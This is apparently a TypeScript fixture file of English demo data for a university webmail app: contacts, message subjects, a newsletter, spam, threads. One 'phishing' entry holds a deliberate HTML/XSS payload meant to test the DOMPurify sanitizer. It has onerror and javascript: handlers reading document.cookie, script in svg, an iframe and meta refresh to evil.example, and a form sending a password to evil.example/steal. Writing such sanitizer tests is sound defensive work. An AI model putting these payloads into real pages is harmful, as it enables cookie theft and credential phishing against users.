/**
 * Jeu de données démo en anglais — mêmes clés que fr.ts (vérifié par le typecheck),
 * utilisé uniquement pour les boîtes démo dont la langue résolue est `en`
 * (Accept-Language de la requête POST /api/auth/demo, cf. server/lib/i18n).
 *
 * `phishing.html` reste volontairement le même payload malveillant que la version
 * française : c'est ce payload (pas sa langue) qui exerce le sanitiseur DOMPurify.
 */
import type { FixtureLocaleData } from './types'

const en: FixtureLocaleData = {
  people: [
    'Camille Laurent <camille.laurent@universite.example>',
    'Hugo Bernard <hugo.bernard@universite.example>',
    'Léa Dubois <lea.dubois@universite.example>',
    'Registrar’s Office <registrar@universite.example>',
    'Nathan Moreau <nathan.moreau@universite.example>',
    'Chloé Petit <chloe.petit@universite.example>',
    'IT Department <it@universite.example>',
    'Inès Garcia <ines.garcia@universite.example>',
  ],

  topics: [
    { subject: 'Group project timeline 5.01', body: 'Here’s the updated timeline for the project. Presentations will be held next week.' },
    { subject: 'Meeting minutes', body: 'Thanks everyone for attending. You’ll find the topics covered below.' },
    { subject: 'Room change — Thursday’s class', body: 'Thursday’s class will be held in room B204 instead of A102.' },
    { subject: 'Web project submission', body: 'Remember to submit your project on Moodle before Friday 6pm.' },
    { subject: 'Question about the Vue.js lab', body: 'Did anyone manage to get the router working with dynamic parameters?' },
    { subject: 'Internship: agency opening', body: 'A local agency is looking for a front-end development intern for spring.' },
    { subject: 'Mail server maintenance', body: 'Webmail will be unavailable Saturday from 8am to 10am for maintenance.' },
    { subject: 'Absence follow-up', body: 'Please justify your absences with the registrar’s office as soon as possible.' },
    { subject: 'Open house photos', body: 'Photos from the open house are available on the department’s drive.' },
    { subject: 'Coffee ☕ Thursday?', body: 'Shall we meet at the cafeteria Thursday at 10am to talk about the project?' },
  ],

  greetingOpen: 'Hi,',
  greetingClose: 'Best,',

  newsletter: {
    subject: 'The Campus Newsletter — September',
    text: 'The campus newsletter (text version).',
    html: '<div style="font-family:Arial;max-width:600px"><img src="https://cdn.example.org/header.png" alt="Header" width="600"><h1 style="color:#0b57d0">The Campus Newsletter</h1><p>Back to school, projects, events: all the news this month.</p><img src="https://cdn.example.org/photo-jpo.jpg" alt="Open House"><img src="https://cdn.example.org/agenda.png" alt="Agenda"><p><a href="https://www.example.org/lettre">Read online</a></p><img src="https://track.example.org/open.gif?u=dev" width="1" height="1" alt=""></div>',
  },

  phishing: {
    subject: 'Unpaid invoice — action required',
    // Payload identique à la version française (contrat) : c'est l'attaque qui compte, pas sa langue.
    html: '<p>Votre compte sera suspendu.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Payer maintenant</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
  },

  gradeReport: {
    subject: 'Grade report — semester 4',
    text: 'Hello,\n\nPlease find your grade report attached.\n\nThe Registrar’s Office',
    filename: 'grade-report-S4.pdf',
  },

  logoMockup: {
    subject: 'Mockup with embedded logo',
    html: '<p>Here is the mockup with the logo:</p><p><img src="cid:logo@demo" alt="Logo" width="64" height="64"></p>',
  },

  longSubject: {
    subject: 'A very long subject line to check that the message list truncates the text correctly without breaking the layout on mobile at 320 pixels wide',
    text: 'Short text.',
  },

  fieldTrip: {
    subject: 'Field trip photos',
    text: 'Here are the photos from the museum trip, and my notes.',
    notesFilename: 'notes.txt',
    notesContent: 'Field trip notes:\n- museum\n- lunch\n',
  },

  meetingConfirm: {
    subject: 'Meeting: please confirm',
    text: 'Hi,\n\nPlease confirm you’ve read this message before Monday’s meeting.\n\nHugo',
  },

  replyThread: {
    subject: 'Re: Timeline',
    text: 'Thursday works for me.\n\n> Proposed schedule: Thursday 2pm.',
    html: '<p>Thursday works for me.</p><blockquote><p>Proposed schedule: Thursday 2pm.</p><blockquote><p>Original message.</p></blockquote></blockquote>',
  },

  sentReplyBody: 'Thanks, got it!',

  draft: {
    subject: 'Draft: ideas for the group project',
    text: 'A few ideas to flesh out…',
  },

  trash: {
    subject: n => `Old notification ${n}`,
    text: 'Deleted notification.',
  },

  projects: {
    subject: n => `Group project — step ${n}`,
    text: n => `Step ${n} of the group project.`,
  },

  mailingList: {
    to: 'Class of 2026 List <class-2026@universite.example>',
    subject: 'Class of 2026 List: welcome-back meeting',
    text: 'Hello everyone,\n\nThe welcome-back meeting will be held Tuesday at 9am in the lecture hall.\n\nInès',
    listId: 'Class of 2026 List <class-2026.universite.example>',
    listPost: '<mailto:class-2026@universite.example>',
  },

  vcard: {
    subject: 'Léa’s business card',
    text: 'Here’s my business card, for your address book.',
    org: 'Example University',
    title: 'Lecturer',
  },

  projectsSubfolder: {
    subject: 'Project 2026 — specification document',
    text: 'The 2026 project specification document is ready.',
  },

  archives: {
    subject: 'Semester 1 archives',
    text: 'Semester 1 documents.',
  },

  spam: {
    from: 'Winner <promo@loterie.example>',
    subject: 'You’ve won an iPhone!!!',
    text: 'Click here.',
  },
}

export default en
